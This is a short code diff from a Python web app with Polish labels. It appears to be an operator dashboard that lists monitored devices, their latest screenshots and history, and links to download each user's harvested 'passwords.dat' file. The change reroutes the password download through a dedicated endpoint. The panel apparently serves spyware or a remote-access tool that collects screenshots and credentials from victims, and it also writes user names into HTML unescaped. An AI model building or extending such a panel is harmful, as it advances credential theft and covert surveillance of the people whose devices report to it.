@@ -41,7 +41,7 @@ def index():
     for u, status, t, has_passwords in device_list:
         content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
         if has_passwords:
-            content += f' | <a href="/screens/{u}/passwords.dat" download>🔐 Hasła</a>'
+            content += f' | <a href="/download_passwords/{u}">🔐 Hasła</a>'
         content += '</li>'
     content += "</ul>"
     return content
